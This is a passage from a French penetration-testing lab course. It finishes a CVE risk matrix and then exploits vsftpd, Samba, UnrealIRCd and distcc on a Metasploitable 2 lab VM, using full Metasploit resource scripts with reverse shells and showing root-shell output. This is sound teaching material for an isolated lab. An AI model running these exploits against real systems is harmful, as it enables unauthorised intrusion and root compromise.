CVE-2021-4158,QEMU hote,6.0-6.x,-,hors perimetre,non applicable,non applicable,hors perimetre,Ne pas exposer QEMU hors VirtualBox,Veille fournisseur
CSV
head -3 preuves/ch1-lab6/matrice-risques.csv
awk -F, 'NR>1 {print $8}' preuves/ch1-lab6/matrice-risques.csv | sort | uniq -c
```

**Explication de la commande**

- `cat > preuves/ch1-lab6/matrice-risques.csv <<'CSV'` : écrit le fichier CSV depuis l'entrée standard, sans interprétation des variables.
- `<<'CSV'` : heredoc avec délimiteur `CSV` ; les guillemets empêchent l'expansion du shell.
- Les neuf lignes suivantes : une ligne par CVE, avec les colonnes `cve`, `service`, `version`, `port`, `decision`, `probabilite`, `impact`, `risque`, `mitigation` et `detection`.
- `head -3` : vérifie l'en-tête et les deux premières lignes.
- `awk -F, 'NR>1 {print $8}'` : extrait la huitième colonne, `risque`.
- `| sort | uniq -c` : compte les occurrences de chaque niveau de risque.
- La matrice contient 9 risques : 4 critiques (vsftpd, Samba, UnrealIRCd, distcc), 3 élevés (Apache, PHP, OpenSSL), 1 faible (ProFTPD) et 1 hors périmètre (CVE-2021-4158, QEMU hôte absent de VirtualBox).
- Piège courant : compter ProFTPD comme critique parce que la CVE existe ; la version n'est pas dans la plage.

**Résultat attendu**

```text
4 critique
3 eleve
1 faible
1 hors perimetre
```

**Preuve** — `preuves/ch1-lab6/matrice-risques.csv`.

#### Étape 6 — Vérifier les décisions de rejet

**But** — contrôler que les candidats rejetés restent dans la matrice et ne sont pas comptés comme vulnérabilités actives.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — `matrice-risques.csv` construite à l'étape 5.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
grep -E 'CVE-2010-4221|CVE-2021-4158' preuves/ch1-lab6/matrice-risques.csv
```

**Explication de la commande**

- `grep` : filtre les lignes du fichier.
- `-E` : active les expressions régulières étendues.
- `CVE-2010-4221|CVE-2021-4158` : sélectionne les deux lignes de rejet ou hors périmètre.
- `preuves/ch1-lab6/matrice-risques.csv` : matrice à contrôler.
- Piège courant : supprimer une ligne rejetée pour « nettoyer » la matrice ; elle doit rester pour la traçabilité.

**Résultat attendu**

`rejetee` pour ProFTPD `1.3.1` et `hors perimetre` pour CVE-2021-4158. Ces deux lignes ne doivent pas être comptées comme vulnérabilités actives. Une ligne `rejetee` n'est pas une vulnérabilité active ; une ligne `non verifiable` n'est pas une absence de vulnérabilité.

**Preuve** — `preuves/ch1-lab6/matrice-risques.csv`.

#### Étape 7 — Ajouter la couverture des services

**But** — vérifier que chaque service du Lab-05 est relié à une preuve et à une décision dans un fichier de couverture.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — preuves du Lab-05 disponibles ; matrice de l'étape 5.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
cat > preuves/ch1-lab6/couverture-services.csv <<'CSV'
service,port,outil,preuve,decision
FTP,21,curl,ftp-anon-curl.txt,configuration a risque
FTP,2121,nmap,ftp-alt-version.txt,version identifiee
SSH,22,ssh,ssh-banner.txt,auth requise
Telnet,23,nmap,telnet-nmap-version.txt,service en clair
SMTP,25,nc,smtp-banner.txt,banniere
DNS,53,dig,dns-version.txt,version exposee
HTTP,80,curl/whatweb/nikto,gobuster-80.txt,configuration a risque
RPC,111,rpcinfo,rpcinfo.txt,enumeration
NFS,2049,showmount,showmount.txt,export large
SMB,139;445,smbclient,smbclient-list.txt,partages anonymes
MySQL,3306,mysql,mysql-version.txt,root sans mot de passe
PostgreSQL,5432,psql,psql-version.txt,compte de test
VNC,5900,nmap,vnc-info.txt,auth VNC
X11,6000,xdpyinfo,x11-access.txt,acces refuse
IRC,6667,nc,irc-banner.txt,version identifiee
Tomcat,8180,curl/whatweb,tomcat-headers.txt,version identifiee
AJP13,8009,nmap,ajp13-version.txt,connecteur expose
RMI,1099,nmap,rmi-dumpregistry.txt,registre non enumere
distcc,3632,nmap,distcc-version.txt,service critique
r-services,512-514,nmap,rservices.txt,service en clair
bindshell,1524,nmap,bindshell-version.txt,shell root expose
CSV
wc -l preuves/ch1-lab6/couverture-services.csv
```

**Explication de la commande**

- `cat > ... <<'CSV'` : écrit le fichier de couverture depuis l'entrée standard.
- `<<'CSV'` : heredoc sans expansion du shell.
- Les 21 lignes suivantes : un service par ligne, avec `service`, `port`, `outil`, `preuve` et `decision`.
- `wc -l` : compte les lignes, en-tête compris.
- Chaque ligne renvoie à une preuve du Lab-05. Si une preuve manque, la ligne est `non verifiable` et le service est marqué comme gap.
- Piège courant : déclarer un service couvert sans preuve associée ; la ligne doit pointer vers un fichier réel.

**Résultat attendu**

22 lignes (1 en-tête + 21 services).

**Preuve** — `preuves/ch1-lab6/couverture-services.csv`.

#### Étape 8 — Geler la matrice

**But** — calculer les empreintes de la matrice et des preuves, puis vérifier leur intégrité.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — matrice, couverture et preuves des étapes 1 à 7.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
sha256sum preuves/ch1-lab6/*.csv preuves/ch1-lab6/*.txt > preuves/ch1-lab6/SHA256SUMS
sha256sum -c preuves/ch1-lab6/SHA256SUMS
```

**Explication de la commande**

- `sha256sum` : calcule l'empreinte SHA-256 de chaque fichier listé.
- `preuves/ch1-lab6/*.csv` : matrices et couverture.
- `preuves/ch1-lab6/*.txt` : preuves texte.
- `> preuves/ch1-lab6/SHA256SUMS` : écrit les empreintes.
- `sha256sum -c` : vérifie chaque fichier contre le fichier de sommes ; `OK` signifie que l'empreinte correspond.
- Le fichier `SHA256SUMS` ne s'inclut pas lui-même.
- Piège courant : conserver la matrice sans les preuves ; une matrice sans preuve n'est pas auditable.

**Résultat attendu**

`OK` pour chaque fichier.

**Preuve** — `preuves/ch1-lab6/SHA256SUMS`.

### En conclusion

Vous avez une matrice de 9 risques, 4 critiques, 3 élevés, 1 faible et 1 hors périmètre, avec mitigation et détection. Le chapitre 2 peut commencer : les labs suivants s'appuient sur ce plan gelé et ces preuves.

```mermaid
flowchart TB
    A["Candidat CVE"] --> B{"Version observée<br/>dans la plage ?"}
    B -->|non| C["Rejeté<br/>risque faible"]
    B -->|oui| D{"Exploit public<br/>vérifié ?"}
    D -->|non| E["Non vérifiable<br/>risque inconnu"]
    D -->|oui| F{"Condition d'accès<br/>confirmée ?"}
    F -->|non| G["Conditionnel<br/>risque élevé"]
    F -->|oui| H["Validé<br/>risque critique"]
    C --> I["Matrice<br/>+ mitigation"]
    E --> I
    G --> I
    H --> I
    I --> J["Décision<br/>go / no-go"]

    classDef src fill:#e3f2fd,stroke:#1565c0,color:#000
    classDef proc fill:#fff3e0,stroke:#ef6c00,color:#000
    classDef ok fill:#ffebee,stroke:#c62828,color:#000
    classDef mid fill:#fff8e1,stroke:#f9a825,color:#000
    classDef ko fill:#e8f5e9,stroke:#2e7d32,color:#000
    class A,B,D,F src
    class C ko
    class E mid
    class G mid
    class H ok
    class I,J proc
```

**Fig 11.1** — Arbre de décision de la matrice de risques. La version d'abord, l'exploit ensuite, la condition d'accès enfin. Une case « non » ne signifie pas « absent » : elle signifie « non validé avec les preuves locales ».

**Matrice de risques attendue**

| CVE | Service | Version | Décision | Probabilité | Impact | Risque | Mitigation principale |
|---|---|---|---|---|---|---|---|
| CVE-2011-2523 | vsftpd | 2.3.4 | validée | certaine | critique | **critique** | remplacer vsftpd, fermer 21 |
| CVE-2007-2447 | Samba | 3.0.20-Debian | validée | certaine | critique | **critique** | désactiver SMB1 et `username map script` |
| CVE-2010-2075 | UnrealIRCd | 3.2.8.1 | validée | certaine | critique | **critique** | remplacer le binaire, filtrer 6667/6697 |
| CVE-2004-2687 | distccd | v1 | validée | certaine | critique | **critique** | désactiver distcc |
| CVE-2010-4221 | ProFTPD | 1.3.1 | rejetée | faible | faible | **faible** | mise à jour préventive |
| CVE-2011-3192 | Apache | 2.2.8 | documentée | probable | élevé | **élevé** | patch, limitation de requête |
| CVE-2012-1823 | PHP | 5.2.4 | conditionnelle | probable | élevé | **élevé** | désactiver CGI, mettre à jour PHP |
| CVE-2008-0166 | OpenSSL | 0.9.8g-4ubuntu3 | validée (version) | certaine | élevé | **élevé** | régénérer les clés, mettre à jour |
| CVE-2021-4158 | QEMU (hôte) | 6.0–6.x | hors périmètre | non applicable | non applicable | **hors périmètre** | ne pas exposer QEMU hors VirtualBox |

**Critères de réussite**

- [ ] Le XML Nmap est présent et lisible.
- [ ] `searchsploit --nmap` est exécuté et sa limite est notée.
- [ ] Les neuf CVE sont recherchées avec `--cve`.
- [ ] Les quatre exploits principaux ont leurs métadonnées.
- [ ] ProFTPD `1.3.1` est rejeté avec justification.
- [ ] CVE-2021-4158 est marquée hors périmètre (QEMU hôte), pas « absente » ni « non vérifiable ».
- [ ] La matrice CSV contient 10 colonnes et 9 risques.
- [ ] Les niveaux de risque sont dérivés de la table, pas d'un CVSS inventé.
- [ ] Chaque ligne a une mitigation et une détection.
- [ ] Tous les exploits sont exécutés dans le lab sans limitation.
- [ ] La couverture des services contient 21 lignes.

## Lab-07 — Exploitation des CVE validées

### Énoncé / Contexte

Le Lab-06 a produit une matrice de risques. Quatre CVE sont classées critiques et associées à un module Metasploit vérifié : vsftpd 2.3.4 (CVE-2011-2523), Samba 3.0.20 (CVE-2007-2447), UnrealIRCd 3.2.8.1 (CVE-2010-2075) et distccd v1 (CVE-2004-2687). Ce lab les exécute une par une, dans l'ordre, pour produire une preuve d'accès réelle et documentée.

**Place dans la chaîne** — après la qualification des CVE (Lab-06), avant l'exploitation web (Lab-08). C'est la phase d'aboutissement réseau : accès, exécution de commande et constat de privilège.

**Objectif** — obtenir un shell sur Metasploitable 2 par chaque vecteur, exécuter `id; hostname; uname -a`, enregistrer la preuve, puis fermer la session. Le lab ne cherche pas à obtenir le plus de shells possible : il cherche à rendre chaque résultat **reproductible, attribuable et limité**.

**Ce que vous devez obtenir** — quatre preuves `msf-*.txt` avec `# rc=0`, une session ouverte, la sortie de `id`, puis la session fermée. Trois shells sont `root` (vsftpd, Samba, UnrealIRCd) ; distcc donne `daemon`. Cette différence est une information de risque, pas un échec.

> **Périmètre** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`. Aucune autre cible. Tous les exploits validés sont exécutés sans limitation. Prenez un snapshot `avant-exploitation` avant de commencer et restaurez-le après.

**Ce que ce lab exécute** — toutes les CVE validées sont exploitées sans limitation. Les CVE non exploitables sont qualifiées à l'étape 8 de ce lab avec une justification. Une CVE non exécutée n'est pas une CVE oubliée : c'est une décision documentée.

**Plan MITRE ATT&CK**

| Élément | Valeur |
|---|---|
| Tactique | Lateral Movement (TA0008), Execution (TA0002) |
| Technique | T1210 Exploitation of Remote Services, T1059.004 Unix Shell |
| Procédure | Metasploit `vsftpd_234_backdoor`, `usermap_script`, `unreal_ircd_3281_backdoor`, `distcc_exec` |
| Source de données | Journaux Metasploit, sessions, `id`, `hostname`, `uname -a`, preuves `prouve` |
| Détection | Connexions sortantes vers `192.168.56.101:4446-4448`, port `6200/tcp`, processus `smbd`, `unrealircd`, `distccd`, shell enfant |
| Mitigation | Patch, désactivation des services, segmentation, filtrage sortant, moindre privilège |
| Statut | Exécuté dans le lab, sur cible isolée |

> **Avenant ATT&CK** — T1210 et T1059.004 sont ajoutés au chapitre 1 par l'avenant A.7. Les 24 entrées du plan maître v1.0 restent la référence ; cet avenant documente les deux labs d'exploitation sans réécrire rétroactivement le plan.

**Prérequis**

- Kali `192.168.56.101`, utilisateur `kali`, mot de passe `kali`.
- Metasploitable 2 `192.168.56.103`, utilisateur `msfadmin`, mot de passe `msfadmin`.
- Snapshot `avant-exploitation` de Metasploitable 2. La VM est démarrée et `ping -c 2 192.168.56.103` répond.
- Services ouverts sur la cible : `21/tcp` (vsftpd), `445/tcp` (Samba), `6667/tcp` (UnrealIRCd), `3632/tcp` (distccd). Port `6200/tcp` fermé avant le test vsftpd.
- Outils sur Kali : `msfconsole`, `searchsploit`, `nc`, `timeout`, `grep`, `sha256sum`, `scp`. La fonction `prouve` est chargée avec `source ~/prouve.sh`.
- Répertoire de travail sur Kali : `~/preuves/ch1-lab7/exploitation`. Répertoire d'archivage sur l'hôte : `preuves/ch1-lab7`.
- Les quatre fichiers `.rc` et le runner `run-cve.sh` fournis à l'étape 2 de ce lab. Si vous les recréez, conservez exactement les mêmes adresses, ports et payloads.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `msfconsole` | `use`, `set`, `exploit -z`, `sessions -l`, `sessions -c`, `sessions -K` | Exploitation des quatre CVE |
| `prouve` | `prouve msf-*.txt timeout 180 msfconsole -q -r ...` | Preuve horodatée avec code retour |
| `nc` | `nc -zv 192.168.56.103 21 445 6667 3632 6200` | Vérification des services et du port 6200 |
| `searchsploit` | `searchsploit --cve CVE-...` | Contrôle de présence des CVE dans Kali |
| `timeout` | `timeout 180 msfconsole ...` | Borne la durée d'un module |
| `scp` / `sha256sum` | Archivage et hachage | Intégrité des preuves |

### Commande et laboratoire étape par étape

#### Étape 1 — Vérifier l'état de départ

**But** — confirmer la joignabilité de la cible, l'ouverture des quatre services et la disponibilité des ports d'écoute avant toute exploitation.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — snapshot `avant-exploitation` pris ; VM démarrée ; fonction `prouve` disponible.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
source ~/prouve.sh
prouve preuves/ch1-lab7/exploitation/00-prerequis.txt bash -c \
  'ping -c 2 192.168.56.103; for p in 21 445 6667 3632; do nc -zv 192.168.56.103 "$p"; done; ss -lntp | grep -E ":4446|:4447|:4448" || true'
```

**Explication de la commande**

- `source ~/prouve.sh` : charge la fonction `prouve` dans le shell courant.
- `prouve ... 00-prerequis.txt` : enregistre le contrôle complet et son code retour.
- `bash -c '...'` : exécute la séquence dans un shell enfant.
- `ping -c 2 192.168.56.103` : envoie deux paquets ICMP pour confirmer la route host-only.
- `for p in 21 445 6667 3632; do ... done` : boucle sur les quatre ports des services.
- `nc -zv 192.168.56.103 "$p"` : teste l'ouverture du port sans envoyer de données.
- `ss -lntp` : liste les sockets TCP en écoute avec les processus.
- `grep -E ":4446|:4447|:4448"` : vérifie qu'aucun listener local n'occupe les LPORT des modules.
- `|| true` : empêche l'échec du `grep` d'interrompre la preuve.
- Piège courant : lancer un module avec un LPORT déjà occupé ; le handler reverse ne démarre pas.

**Résultat attendu**

```text
2 packets transmitted, 2 received, 0% packet loss, time 1006ms
rtt min/avg/max/mdev = 0.374/0.419/0.465/0.045 ms
192.168.56.103: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.56.103] 21 (ftp) open
192.168.56.103: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.56.103] 445 (microsoft-ds) open
192.168.56.103: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.56.103] 6667 (ircd) open
192.168.56.103: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.56.103] 3632 (distcc) open
# rc=0
```

Si `nc` retourne `Connection refused`, ne lancez pas l'exploit : vérifiez la VM, le service et le snapshot. Si `ss` montre un LPORT occupé, changez le LPORT dans le `.rc` et dans le tableau de bord, pas au hasard pendant l'exécution.

**Preuve** — `preuves/ch1-lab7/exploitation/00-prerequis.txt`.

#### Étape 2 — Préparer les scripts

**But** — créer le répertoire de travail, les quatre scripts Metasploit et le runner, puis vérifier leur présence et leur intégrité.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — état de départ vérifié à l'étape 1 ; `msfconsole` installé.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
mkdir -p ~/preuves/ch1-lab7/exploitation
cd ~/preuves/ch1-lab7/exploitation
pwd
```

**Explication de la commande**

- `mkdir -p ~/preuves/ch1-lab7/exploitation` : crée le répertoire de travail et ses parents.
- `cd ~/preuves/ch1-lab7/exploitation` : place le shell dans ce répertoire.
- `pwd` : affiche le chemin courant pour vérifier la localisation.

Créez ensuite les quatre fichiers `.rc` suivants. Chaque script est complet : il ne contient aucun placeholder et utilise les adresses du laboratoire.

**`vsftpd.rc`** — backdoor vsftpd, cible `192.168.56.103:21`, shell sur `6200/tcp`.

```text
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.103
set RPORT 21
set TARGET 1
show options
exploit -z
sleep 8
sessions -l
sessions -c "id; hostname; uname -a"
sleep 2
sessions -K
exit -y
```

**`samba.rc`** — `usermap_script`, cible `192.168.56.103:445`, reverse TCP sur `4446`.

```text
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.103
set RPORT 445
set LHOST 192.168.56.101
set LPORT 4446
set payload cmd/unix/reverse
exploit -z
sleep 6
sessions -l
sessions -c "id; hostname; uname -a"
sleep 2
sessions -K
exit -y
```

**`unreal.rc`** — backdoor UnrealIRCd, cible `192.168.56.103:6667`, reverse TCP sur `4447`.

```text
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.103
set RPORT 6667
set LHOST 192.168.56.101
set LPORT 4447
set payload cmd/unix/reverse
exploit -z
sleep 6
sessions -l
sessions -c "id; hostname; uname -a"
sleep 2
sessions -K
exit -y
```

**`distcc.rc`** — exécution distcc, cible `192.168.56.103:3632`, reverse TCP sur `4448`.

```text
use exploit/unix/misc/distcc_exec
set RHOSTS 192.168.56.103
set RPORT 3632
set LHOST 192.168.56.101
set LPORT 4448
set payload cmd/unix/reverse
exploit -z
sleep 6
sessions -l
sessions -c "id; hostname; uname -a"
sleep 2
sessions -K
exit -y
```

**`run-cve.sh`** — exécute les quatre scripts avec `prouve`, puis affiche les codes retour.

```bash
#!/usr/bin/env bash
# run-cve.sh — exécute les quatre scripts Metasploit de Lab-07.
# Phase MITRE ATT&CK : T1210 (Exploitation of Remote Services),
# T1059.004 (Unix Shell). Chaque module est borné par timeout et enregistré
# par la fonction `prouve` (date, commande, stdout/stderr, code retour).
set -u

# `prouve` est définie par ~/prouve.sh ; on la recharge pour que le runner
# fonctionne aussi dans un shell non interactif.
source /home/kali/prouve.sh

# Répertoire unique des scripts et des preuves du Lab-07.
BASE=/home/kali/preuves/ch1-lab7/exploitation
mkdir -p "$BASE"

# Boucle sur les quatre cibles. L'ordre est volontaire : vsftpd d'abord,
# puis Samba, UnrealIRCd et distcc. `|| true` empêche un échec de module
# d'arrêter les suivants ; le grep final expose les codes retour.
for cve in vsftpd samba unreal distcc; do
  echo "=== $cve ==="
  prouve "$BASE/msf-$cve.txt" \
    timeout 180 msfconsole -q -r "$BASE/$cve.rc" || true
done

# Contrôle final : une ligne `# rc=` par preuve. Un module en échec reste
# visible avec un code non nul ; il ne doit pas être masqué.
for cve in vsftpd samba unreal distcc; do
  grep -H '^# rc=' "$BASE/msf-$cve.txt"
done
```

Contrôlez la présence des fichiers et hachez-les avant le premier lancement :

```bash
ls -l vsftpd.rc samba.rc unreal.rc distcc.rc run-cve.sh
sha256sum vsftpd.rc samba.rc unreal.rc distcc.rc run-cve.sh | tee SHA256SUMS
```

**Explication du runner**

- `set -u` : interdit l'utilisation d'une variable non définie.
- `source /home/kali/prouve.sh` : recharge `prouve` pour un shell non interactif.
- `BASE=/home/kali/preuves/ch1-lab7/exploitation` : fixe le répertoire unique des scripts et des preuves.
- `for cve in vsftpd samba unreal distcc; do ... done` : exécute les quatre modules dans l'ordre.
- `prouve "$BASE/msf-$cve.txt" timeout 180 msfconsole -q -r "$BASE/$cve.rc"` : enregistre chaque exécution et borne chaque module à 180 secondes.
- `|| true` : empêche un échec de module d'arrêter les suivants.
- Le second `for` et `grep -H '^# rc='` : affichent le code retour de chaque preuve.
- `sha256sum ... | tee SHA256SUMS` : calcule et affiche les empreintes tout en les enregistrant.
- Piège courant : modifier un `.rc` après le calcul des empreintes ; le hash ne correspond plus.

**Résultat attendu**

Cinq fichiers listés, cinq empreintes SHA-256, puis `# rc=` visible dans chaque preuve d'exploitation. Les scripts ne contiennent ni `check` pour vsftpd, ni commande de persistance, ni commande de déni de service.

**Preuve** — `preuves/ch1-lab7/exploitation/vsftpd.rc`, `samba.rc`, `unreal.rc`, `distcc.rc`, `run-cve.sh` et `SHA256SUMS`.

#### Étape 3 — vsftpd 2.3.4 (CVE-2011-2523)

**But** — déclencher la backdoor du binaire vsftpd 2.3.4, obtenir un shell root sur le port `6200/tcp`, puis vérifier la fermeture du port.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — port `21/tcp` ouvert, port `6200/tcp` fermé, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`

**Exemple de commande**

```bash
prouve msf-vsftpd.txt timeout 180 msfconsole -q -r vsftpd.rc
prouve msf-vsftpd-port6200.txt bash -c 'nc -zv 192.168.56.103 6200'
```

**Explication de la commande**

- `prouve msf-vsftpd.txt` : enregistre la session Metasploit et le code retour.
- `timeout 180` : borne l'exécution à 180 secondes.
- `msfconsole -q` : lance Metasploit en mode silencieux.
- `-r vsftpd.rc` : exécute le script de ressources vsftpd.
- `use exploit/unix/ftp/vsftpd_234_backdoor` : charge le module dédié à la backdoor vsftpd 2.3.4.
- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
- `set RPORT 21` : fixe le port FTP, qui déclenche la backdoor.
- `set TARGET 1` : sélectionne `Backdoor Command Shell`, avec un shell sur `6200/tcp`.
- `show options` : affiche les options réellement prises en compte.
- `exploit -z` : lance l'exploit et met la session en arrière-plan après ouverture.
- `sleep 8` : laisse à la backdoor le temps d'ouvrir `6200/tcp`.
- `sessions -l` : inventorie la session et affiche le couple source/destination.
- `sessions -c "id; hostname; uname -a"` : exécute trois commandes courtes et non destructives pour identifier le contexte.
- `sessions -K` : ferme la session ; aucune persistance n'est laissée.
- `exit -y` : quitte `msfconsole` sans confirmation interactive.
- `prouve msf-vsftpd-port6200.txt bash -c 'nc -zv ...'` : exécute le contrôle de fermeture et l'enregistre.
- `nc -zv 192.168.56.103 6200` : teste le port `6200/tcp` sans envoyer de données.
- Piège courant : ajouter `check` avant `exploit -z`. Le module exécute déjà son auto-check ; un `check` explicite peut déclencher la backdoor, laisser `6200/tcp` ouvert, puis provoquer l'échec.

**Résultat attendu**

```text
[*] 192.168.56.103:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.56.103:21 - Backdoor has been spawned!
[*] Command shell session 1 opened (192.168.56.101:37295 -> 192.168.56.103:6200) at 2026-11-16 17:59:56 +0100
...
uid=0(root) gid=0(root)
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
# rc=0
(UNKNOWN) [192.168.56.103] 6200 (?) : Connection refused
# rc=1
```

**Lecture** — la ligne `Command shell session 1 opened (... -> 192.168.56.103:6200)` établit la connexion, et `uid=0(root)` établit le privilège. Les deux lignes sont dans le même fichier `prouve`, avec `# date`, `# cmd` et `# rc=0`. Le second contrôle retourne `Connection refused` avec `# rc=1` : il confirme que la session a bien été fermée. Si le port reste ouvert, attendez ou restaurez le snapshot ; ne laissez pas un shell ouvert entre deux étapes.

**Preuve** — `preuves/ch1-lab7/exploitation/msf-vsftpd.txt` et `msf-vsftpd-port6200.txt`.

#### Étape 4 — Samba 3.0.20 (CVE-2007-2447)

**But** — exploiter `username map script` dans Samba 3.0.20 et obtenir un shell root par reverse TCP.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — port `445/tcp` ouvert, LPORT `4446` libre, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`

**Exemple de commande**

```bash
prouve msf-samba.txt timeout 180 msfconsole -q -r samba.rc
```

**Explication de la commande**

- `prouve msf-samba.txt` : enregistre la session Metasploit et le code retour.
- `timeout 180` : borne l'exécution à 180 secondes.
- `msfconsole -q` : lance Metasploit en mode silencieux.
- `-r samba.rc` : exécute le script de ressources Samba.
- `use exploit/multi/samba/usermap_script` : charge le module qui exploite l'option `username map script`.
- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
- `set RPORT 445` : fixe le port SMB.
- `set LHOST 192.168.56.101` : fixe l'adresse d'écoute, joignable depuis la cible.
- `set LPORT 4446` : fixe le port d'écoute et évite les conflits avec les autres modules.
- `set payload cmd/unix/reverse` : charge un shell Unix reverse, sans Meterpreter.
- `exploit -z` : lance l'exploit et met la session en arrière-plan.
- `sleep 6` : laisse le temps au handler et au shell de s'établir.
- `sessions -l` : inventorie la session et son port source.
- `sessions -c "id; hostname; uname -a"` : exécute les commandes de preuve.
- `sessions -K` : ferme la session ; aucune persistance.
- `exit -y` : quitte Metasploit.
- Piège courant : lancer deux modules en parallèle sur le même LPORT ; le second handler ne démarre pas. Vérifiez avec `ss -lntp | grep 4446` et changez le LPORT dans le `.rc` si nécessaire.

**Résultat attendu**

```text
[*] Started reverse TCP double handler on 192.168.56.101:4446
[*] Command shell session 1 opened (192.168.56.101:4446 -> 192.168.56.103:43138) at 2026-11-16 18:00:25 +0100
...
uid=0(root) gid=0(root)
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
# rc=0
```

**Lecture** — `smbd` tourne en root sur cette image et le script `username map` est exécuté avec ses privilèges. Le résultat `uid=0(root)` est donc attendu, mais il doit être prouvé, pas supposé. Si le port `445` est filtré, le module échoue avant le handler : revenez au Lab-05 et vérifiez le service.

**Preuve** — `preuves/ch1-lab7/exploitation/msf-samba.txt`.

#### Étape 5 — UnrealIRCd 3.2.8.1 (CVE-2010-2075)

**But** — déclencher la backdoor d'UnrealIRCd 3.2.8.1 et obtenir un shell root.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — port `6667/tcp` ouvert, LPORT `4447` libre, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`

**Exemple de commande**

```bash
prouve msf-unreal.txt timeout 180 msfconsole -q -r unreal.rc
```

**Explication de la commande**

- `prouve msf-unreal.txt` : enregistre la session Metasploit et le code retour.
- `timeout 180` : borne l'exécution à 180 secondes.
- `msfconsole -q` : lance Metasploit en mode silencieux.
- `-r unreal.rc` : exécute le script de ressources UnrealIRCd.
- `use exploit/unix/irc/unreal_ircd_3281_backdoor` : charge le module de la backdoor UnrealIRCd 3.2.8.1.
- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
- `set RPORT 6667` : fixe le port IRC en clair ; `6697` est le port TLS et ne déclenche pas le même chemin.
- `set LHOST 192.168.56.101` : fixe l'adresse d'écoute.
- `set LPORT 4447` : fixe le port d'écoute et évite le conflit avec Samba.
- `set payload cmd/unix/reverse` : charge un shell Unix reverse.
- `exploit -z` : lance l'exploit et met la session en arrière-plan.
- `sleep 6` : laisse le temps au shell de revenir.
- `sessions -l` : inventorie la session.
- `sessions -c "id; hostname; uname -a"` : exécute les commandes de preuve.
- `sessions -K` : ferme la session ; aucune persistance.
- `exit -y` : quitte Metasploit.
- Piège courant : confondre `6667` et `6697`. Le module cible l'IRC en clair ; `6697` peut être fermé ou TLS et donner un faux négatif. L'auto-check IRC du module est normal, contrairement au `check` explicite de vsftpd.

**Résultat attendu**

```text
[+] 192.168.56.103:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
[*] 192.168.56.103:6667 - Sending IRC backdoor command
[*] Command shell session 1 opened (192.168.56.101:4447 -> 192.168.56.103:44470) at 2026-11-16 18:01:58 +0100
...
uid=0(root) gid=0(root)
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
# rc=0
```

**Lecture** — le démon UnrealIRCd de Metasploitable 2 tourne en root ; la backdoor exécute la commande avec ce privilège. Le résultat est cohérent avec la matrice de risques du Lab-06.

**Preuve** — `preuves/ch1-lab7/exploitation/msf-unreal.txt`.

#### Étape 6 — distccd v1 (CVE-2004-2687)

**But** — exécuter une commande via `distccd` et obtenir un shell avec l'utilisateur `daemon`.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — port `3632/tcp` ouvert, LPORT `4448` libre, snapshot `avant-exploitation` pris, scripts de l'étape 2 présents.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`

**Exemple de commande**

```bash
prouve msf-distcc.txt timeout 180 msfconsole -q -r distcc.rc
```

**Explication de la commande**

- `prouve msf-distcc.txt` : enregistre la session Metasploit et le code retour.
- `timeout 180` : borne l'exécution à 180 secondes.
- `msfconsole -q` : lance Metasploit en mode silencieux.
- `-r distcc.rc` : exécute le script de ressources distcc.
